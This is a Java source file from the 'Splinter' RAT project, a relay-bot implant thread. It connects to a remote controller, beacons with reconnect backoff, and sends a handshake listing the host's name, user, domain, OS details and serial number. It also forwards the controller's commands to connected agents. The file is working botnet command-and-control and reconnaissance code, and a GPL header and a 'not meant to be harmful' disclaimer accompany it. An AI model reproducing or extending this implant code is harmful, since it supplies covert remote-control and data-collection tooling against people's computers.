/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package RelayBot;

import Implant.Driver;
import Implant.Payloads.MapSystemProperties;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import javax.swing.Timer;

public class DEPRECATED_RelayBot_ForwardConnectionThread extends Thread
  implements Runnable, ActionListener
{
  static String strMyClassName = "RelayBot_ForwardConnectionThread";

  DEPRECATED_RelayBot_AgentConnectedToRelayBot parent = null;

  String strAddrToController = "";
  int portToController = 0;
  boolean beaconUponDisconnection = false;
  boolean beaconToControllerImmediatelyUponDisconnection = false;
  int beaconInterval_millis = 0;

  boolean respondToTimerInterrupt = false;

  Timer tmrBeacon = null;

  public volatile boolean continueRun = true;

  String myUniqueDelimiter = "";
  String randomNumberReceived = "";

  PrintWriter pwOut_ForwardController = null;

  public volatile boolean initialConnectionEstablished = false;

  Socket sktMyConnection = null;

  String myHandShake = null;

  MapSystemProperties systemMap = null;

  boolean listeningMode = false;

  volatile long disconnectionCount = 0L;

  public String CURRENT_WORKING_DIRECTORY = "";
  volatile File fleCurrentWorkingDirectory = null;

  public DEPRECATED_RelayBot_ForwardConnectionThread(DEPRECATED_RelayBot_AgentConnectedToRelayBot par, String strControllerAddie, int controllerPort, boolean enableBeaconingUponDisconnection, boolean reconnectImmediatelyUponDisconnection, int beaconIntvl_millis)
  {
    try
    {
      this.parent = par;
      this.strAddrToController = strControllerAddie;
      this.portToController = controllerPort;
      this.beaconUponDisconnection = enableBeaconingUponDisconnection;
      this.beaconToControllerImmediatelyUponDisconnection = reconnectImmediatelyUponDisconnection;
      this.beaconInterval_millis = beaconIntvl_millis;
    }
    catch (Exception e)
    {
      Driver.eop("Constructor - Beacon", "RelayBot_ImplantThread", e, e.getLocalizedMessage(), false);
    }
  }

  public void run()
  {
    if (this.sktMyConnection == null)
    {
      startImplant();
    }
    else
    {
      listenToSocket(this.sktMyConnection);

      this.parent.removeForwardConnectionThread(this, getId());

      Driver.sop("Connection has been closed. Terminating this thread...");
    }

    while (this.continueRun);
  }

  public boolean listenToSocket(Socket sktConnection)
  {
    try
    {
      String inputLine = "";
      BufferedReader brIn_ForwardController = null;
      this.pwOut_ForwardController = null;
      this.initialConnectionEstablished = true;

      if (sktConnection != null)
      {
        Driver.sp("Connection established to forward controller (or relay)!  Attempting to open streams on socket...");

        brIn_ForwardController = new BufferedReader(new InputStreamReader(sktConnection.getInputStream()));

        this.pwOut_ForwardController = new PrintWriter(new BufferedOutputStream(sktConnection.getOutputStream()));

        Driver.sop("Streams opened");

        String myHandShakeData = getHandshakeData("#####");

        sendToController_Or_Next_Relay("[RELAY_INITIAL_RGISTRATION]" + myHandShakeData + "%%%%%" + this.parent.getHandShakeRowData(), false);

        this.randomNumberReceived = brIn_ForwardController.readLine();

        this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.randomNumberReceived + "]");

        Driver.sop("HandShake complete. " + this.myUniqueDelimiter);

        while ((this.continueRun) && (!sktConnection.isClosed()) && ((inputLine = brIn_ForwardController.readLine()) != null))
        {
          if (((!inputLine.trim().startsWith(this.myUniqueDelimiter)) && (!inputLine.trim().startsWith("[RELAY_MESSAGE_TO_FORWARD_CONTROLLER]"))) || 
            (!determineCommand(inputLine)))
          {
            this.parent.sendCommand_RAW_ToAgent(inputLine);
          }

        }

        if (inputLine.equals("disconnectImplant"))
        {
          Driver.sop("Disconnection notice received. Terminating program...");
          this.continueRun = false;
        }

      }

      return true;
    }
    catch (NullPointerException npe)
    {
      Driver.sop("Streams closed!");
    }
    catch (SocketException se)
    {
      Driver.sop("Streams closed!!!!");
    }
    catch (Exception e)
    {
      Driver.eop("listenToSocket", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean startImplant()
  {
    try
    {
      do
      {
        try
        {
          Driver.sp("\n" + Driver.getTimeStamp_Without_Date() + " - Attempting to connect to \"" + this.strAddrToController + ":" + this.portToController + "\"...");

          if ((this.strAddrToController != null) && (this.strAddrToController.trim().equalsIgnoreCase("localhost")))
          {
            this.strAddrToController = "127.0.0.1";
          }

          this.sktMyConnection = new Socket(this.strAddrToController, this.portToController);

          if (this.sktMyConnection == null)
          {
            throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");
          }

        }
        catch (Exception e)
        {
          if (this.beaconToControllerImmediatelyUponDisconnection)
          {
            if (!this.initialConnectionEstablished)
            {
              this.beaconInterval_millis = 4000;

              Driver.sop("Initial connection unsuccessful.  Delaying " + this.beaconInterval_millis / 1000 + " secs and attempting to connect one more time to connect");
              this.beaconToControllerImmediatelyUponDisconnection = false;

              if ((this.tmrBeacon != null) && (this.tmrBeacon.isRunning()))
              {
                try
                {
                  this.tmrBeacon.stop();
                } catch (Exception localException1) {
                }
              }
              this.respondToTimerInterrupt = true;
              this.tmrBeacon = new Timer(4000, this);
              this.tmrBeacon.start();
            }

          }
          else
          {
            if (this.beaconUponDisconnection)
            {
              Driver.sop("Unable to connect to \"" + this.strAddrToController + ":" + this.portToController + "\"" + " Sleeping for " + this.beaconInterval_millis / 1000 + " secs before attempting to re-establish connection to controller");
              this.respondToTimerInterrupt = true;
              this.tmrBeacon = new Timer(this.beaconInterval_millis, this);
              this.tmrBeacon.start();
              return true;
            }

            throw new IOException("Unable to connect to \"" + this.strAddrToController + " : " + this.portToController + "\"" + " beaconing is not set. Terminating program...");
          }

        }

        listenToSocket(this.sktMyConnection);

        if (this.beaconToControllerImmediatelyUponDisconnection)
        {
          if (++this.disconnectionCount % 10L == 0L)
          {
            this.beaconToControllerImmediatelyUponDisconnection = false;
            this.beaconInterval_millis = 60000;
            Driver.sop("\n***\n*\n*Threshold reached. Controller not responding. Waiting: " + this.beaconInterval_millis / 1000 + " sec before reconnect\n*\n*\n***\n");
          }

          return startImplant();
        }

        if ((this.beaconUponDisconnection) && (!this.beaconToControllerImmediatelyUponDisconnection) && (this.beaconInterval_millis > 1000))
        {
          if (++this.disconnectionCount % 10L == 0L)
          {
            this.beaconInterval_millis *= 2;
            if (this.beaconInterval_millis > 3000000.0D)
            {
              this.beaconInterval_millis = 3000000;
            }
            Driver.sop("Threshold reached. Controller not responding, waiting: " + this.beaconInterval_millis / 1000 + " seconds before reconnect");
          }

          this.respondToTimerInterrupt = true;

          Driver.sop("Disconnected. Sleeping for " + this.beaconInterval_millis / 1000 + " secs before re-establishing connection to controller");
          this.tmrBeacon = new Timer(this.beaconInterval_millis, this);
          this.tmrBeacon.start();
          return true;
        }

        Driver.sop("Connection lost!  ");
      }
      while (
        this.beaconUponDisconnection);

      throw new IOException("Disconnected from controller.  Beacon is not set.  Terminating program...");
    }
    catch (IOException ioe)
    {
      Driver.sop("Disconnected from controller.  Beacon is not set.  Terminating thread...");
      this.continueRun = false;
    }
    catch (Exception e)
    {
      if ((this.sktMyConnection != null) && ((this.sktMyConnection.isClosed()) || (!this.sktMyConnection.isConnected())))
      {
        Driver.sop("Socket is closed.");

        this.initialConnectionEstablished = false;

        if (this.beaconToControllerImmediatelyUponDisconnection)
        {
          return startImplant();
        }

        if ((this.beaconUponDisconnection) && (!this.beaconToControllerImmediatelyUponDisconnection) && (this.beaconInterval_millis > 1000))
        {
          this.respondToTimerInterrupt = true;

          Driver.sop("Disconnected. Sleeping for " + this.beaconInterval_millis / 1000 + " secs before connecting to controller");
          this.tmrBeacon = new Timer(this.beaconInterval_millis, this);
          this.tmrBeacon.start();
          return true;
        }

        Driver.sop("Terminating program...");
      }

      Driver.sop("Exception caught in startImplant mtd in " + strMyClassName + " Error msg: " + e.getLocalizedMessage());
    }

    return false;
  }

  public String getHandshakeData(String delimeter)
  {
    try
    {
      if (this.myHandShake == null)
      {
        this.systemMap = new MapSystemProperties(false);

        this.myHandShake = (MapSystemProperties.strLaunchPath + delimeter + MapSystemProperties.strHOSTNAME + delimeter + MapSystemProperties.strOS_Name + delimeter + MapSystemProperties.strOS_Type + delimeter + MapSystemProperties.strUserName + delimeter + MapSystemProperties.strUSERDOMAIN + delimeter + MapSystemProperties.strTEMP + delimeter + MapSystemProperties.strUSERPROFILE + delimeter + MapSystemProperties.strPROCESSOR_IDENTIFIER + delimeter + MapSystemProperties.strNUMBER_OF_PROCESSORS + delimeter + MapSystemProperties.strSystemRoot + delimeter + MapSystemProperties.strServicePack + delimeter + MapSystemProperties.strNumUsers + delimeter + MapSystemProperties.strSerialNumber + delimeter + MapSystemProperties.strPROCESSOR_ARCHITECTURE + delimeter + MapSystemProperties.strCountryCode + delimeter + MapSystemProperties.strOsVersion + delimeter + MapSystemProperties.strHOMEDRIVE);
        try
        {
          if ((MapSystemProperties.strLaunchPath == null) || (MapSystemProperties.strLaunchPath.trim().equals("")))
          {
            this.CURRENT_WORKING_DIRECTORY = ("." + Driver.fileSeperator);
          }
          else if (MapSystemProperties.strLaunchDirectory.endsWith(Driver.fileSeperator))
            this.CURRENT_WORKING_DIRECTORY = MapSystemProperties.strLaunchDirectory;
          else {
            this.CURRENT_WORKING_DIRECTORY = (MapSystemProperties.strLaunchDirectory + Driver.fileSeperator);
          }
        }
        catch (Exception e)
        {
          this.CURRENT_WORKING_DIRECTORY = ("." + Driver.fileSeperator);
        }
        this.fleCurrentWorkingDirectory = new File(this.CURRENT_WORKING_DIRECTORY);

        return this.myHandShake;
      }

      return this.myHandShake;
    }
    catch (Exception e)
    {
      Driver.eop("getHandshakeData", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return "";
  }

  public boolean sendToController_Or_Next_Relay(String lineToSend, boolean printStatusToConsoleOut)
  {
    try
    {
      this.pwOut_ForwardController.println(lineToSend);
      this.pwOut_ForwardController.flush();

      if (printStatusToConsoleOut) {
        Driver.sop(lineToSend);
      }
      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendToController_Or_Next_Relay", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean determineCommand(String cmdLine)
  {
    try
    {
      Driver.sop("No special methods in " + strMyClassName + " determineCommand yet");

      String[] cmd = cmdLine.split("%%%%%");

      if ((cmd[1] == null) || (cmd[1].trim().equals("")))
      {
        Driver.sop("Unknown Command received: " + cmdLine);
        return false;
      }

    }
    catch (Exception e)
    {
      Driver.sop("Unknown Command received: " + cmdLine);
    }

    return false;
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if ((ae.getSource() == this.tmrBeacon) && (this.respondToTimerInterrupt))
      {
        try
        {
          this.tmrBeacon.stop();
        } catch (Exception localException1) {
        }
        this.respondToTimerInterrupt = false;

        startImplant();
      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }
}